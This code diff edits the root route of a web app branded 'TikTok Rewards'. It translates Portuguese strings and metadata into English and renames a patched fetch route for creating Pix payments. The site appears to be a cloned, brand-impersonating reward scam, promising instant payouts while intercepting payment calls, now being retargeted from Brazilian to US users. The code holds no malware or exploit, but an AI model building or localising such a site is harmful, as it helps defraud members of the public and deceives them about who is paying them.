@@ -1,4 +1,4 @@
-﻿import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
+import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import {
   Outlet,
   Link,
@@ -17,7 +17,7 @@ const mobileGuardScript = String.raw`
 (() => {
   if (window.__mobileGuardInstalled) return;
   window.__mobileGuardInstalled = true;
-  window.__earlyCelularGuard = true;
+  window.__earlyMobileGuard = true;
 
   const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
   let lastUrl = window.location.href;
@@ -212,7 +212,7 @@ function NotFoundComponent() {
             to="/"
             className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
           >
-            Voltar ao início
+            Go home
           </Link>
         </div>
       </div>
@@ -231,10 +231,10 @@ function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
     <div className="flex min-h-screen items-center justify-center bg-background px-4">
       <div className="max-w-md text-center">
         <h1 className="text-xl font-semibold tracking-tight text-foreground">
-          Esta página não carregou
+          This page didn't load
         </h1>
         <p className="mt-2 text-sm text-muted-foreground">
-          Algo deu errado. Tente atualizar a página ou volte para o início.
+          Something went wrong on our end. You can try refreshing or head back home.
         </p>
         <div className="mt-6 flex flex-wrap justify-center gap-2">
           <button
@@ -244,13 +244,13 @@ function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
             }}
             className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
           >
-            Tentar novamente
+            Try again
           </button>
           <a
             href="/"
             className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
           >
-            Voltar ao início
+            Go home
           </a>
         </div>
       </div>
@@ -264,15 +264,15 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       { charSet: "utf-8" },
       { name: "viewport", content: "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" },
       { name: "theme-color", content: "#ff0050" },
-      { title: "TikTok Recompensas" },
-      { name: "description", content: "Resgate sua recompensa TikTok e receba por Pix, PayPal, Venmo, transferência ou banco." },
-      { name: "author", content: "TikTok Recompensas" },
-      { property: "og:title", content: "TikTok Recompensas" },
-      { property: "og:description", content: "Resgate sua recompensa TikTok e receba por Pix, PayPal, Venmo, transferência ou banco." },
+      { title: "TikTok Rewards" },
+      { name: "description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
+      { name: "author", content: "TikTok Rewards" },
+      { property: "og:title", content: "TikTok Rewards" },
+      { property: "og:description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
-      { name: "twitter:title", content: "TikTok Recompensas" },
-      { name: "twitter:description", content: "Resgate sua recompensa TikTok e receba por Pix, PayPal, Venmo, transferência ou banco." },
+      { name: "twitter:title", content: "TikTok Rewards" },
+      { name: "twitter:description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
       { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
       { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
     ],
@@ -392,10 +392,10 @@ function RootComponent() {
               : input instanceof URL
                 ? input.toString()
                 : (input as Request).url;
-          if (urlStr.includes("/functions/v1/create-pix-pagamento")) {
+          if (urlStr.includes("/functions/v1/create-pix-payment")) {
             const body =
               init?.body ?? (input instanceof Request ? await input.text() : "{}");
-            return origFetch("/api/public/create-pix-pagamento", {
+            return origFetch("/api/public/create-pix-payment", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: body as BodyInit,
@@ -647,7 +647,7 @@ function RootComponent() {
   return (
     <QueryClientProvider client={queryClient}>
       <div id="cloned-root" style={isNativeAppRoute ? { display: "none" } : undefined} />
-      {/* Obrigatório: nested routes render here. Removing <Outlet /> breaks all child routes. */}
+      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
       <Outlet />
     </QueryClientProvider>
   );
